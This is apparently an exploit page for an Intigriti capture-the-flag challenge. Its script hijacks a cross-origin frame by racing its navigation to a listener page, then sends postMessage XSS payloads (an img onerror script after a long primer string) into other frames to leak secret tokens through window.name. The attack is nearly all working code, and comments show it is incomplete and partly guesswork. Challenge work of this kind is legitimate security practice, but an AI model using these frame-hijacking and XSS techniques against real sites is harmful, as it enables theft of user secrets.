<!DOCTYPE html>
<html>
<head>
    <title>Protocol v5: Frame Hijacker</title>
</head>
<body>
    <h1>Protocol v5</h1>
    <p>1. Ensure <b>listener.html</b> is in the same folder.</p>
    <p>2. Click Launch. Do not close tabs.</p>
    <button id="btn" style="font-size:20px; padding:20px; background:#d00; color:white;">LAUNCH HIJACK</button>
    <pre id="log" style="background:#eee; padding:10px;"></pre>

    <script>
        let targetWin = null;
        let stones = {};
        let spaceHijacked = false;

        // Configuration: URL of your listener.html
        const LISTENER_URL = location.href.substring(0, location.href.lastIndexOf('/')) + '/listener.html';

        document.getElementById('btn').addEventListener('click', () => {
            targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
            log("Target launched...");
            
            // RACE CONDITION: We must hijack Frame 3 (Space) BEFORE the parent sends the message.
            // We spam the navigation command immediately.
            let hijacker = setInterval(() => {
                if(targetWin && targetWin.frames && targetWin.frames[3]) {
                    try {
                        // HIJACK SPACE STONE
                        targetWin.frames[3].location = LISTENER_URL;
                        // log("Hijack command sent to Frame 3");
                    } catch(e) {}
                }
            }, 10);

            // Stop hijacking after 2 seconds (it should be done by then)
            setTimeout(() => clearInterval(hijacker), 2000);

            // Start the regular collection loop
            setInterval(collectStones, 500);
        });

        function collectStones() {
            if(!targetWin) return;

            // 1. CHECK HIJACKED SPACE STONE
            try {
                // If hijack worked, the frame is now Same-Origin to us!
                // We can read its name directly.
                let spaceName = targetWin.frames[3].name;
                if(spaceName && spaceName.startsWith("SPACE_CAPTURED:")) {
                    let secret = spaceName.split(':')[1];
                    if(!stones[3]) {
                        stones[3] = secret;
                        log("[+] HIJACK SUCCESS! Space Stone: " + secret);
                    }
                }
            } catch(e) {}

            // 2. ATTACK OTHER STONES (Power, Reality, Soul, Mind)
            // Note: We skip Time (4) for now as it is Sandboxed.
            [0, 1, 2, 5].forEach(i => {
                if(stones[i]) return;
                try {
                    let f = targetWin.frames[i];
                    // Primer
                    f.postMessage("A".repeat(2500) + "<", '*');
                    // Payload
                    let script = `
                        var m = location.search.match(/=[a-f0-9]{8}/);
                        if(m) window.name = "STONE:${i}:" + m[0].substring(1);
                    `;
                    f.postMessage(`<img src=x onerror='${script}'>`, '*');
                    
                    // Collect
                    let data = f.name;
                    if(data && data.startsWith(`STONE:${i}:`)) {
                        stones[i] = data.split(':')[2];
                        log(`[+] Got Stone ${i}: ${stones[i]}`);
                    }
                } catch(e) {}
            });

            checkWin();
        }

        function checkWin() {
            // We need 6 stones. We likely have 5 now (0,1,2,3,5).
            // We are missing Time (4).
            
            let count = Object.keys(stones).length;
            if(count >= 5 && !stones[4]) {
                 log("We have 5 stones! Missing Time Stone.");
                 log("Attempting Brute Force or Partial Attack...");
                 
                 // THIS IS THE GUESS:
                 // Maybe we can just send the 5 stones we have?
                 // Or maybe we can guess the Time Stone?
            }
            
            // Visual Update
            document.getElementById('log').innerText = 
                `Stones: ${count}/6\n` + 
                JSON.stringify(stones, null, 2);
        }
        
        function log(msg) { console.log(msg); }
    </script>
</body>
</html>
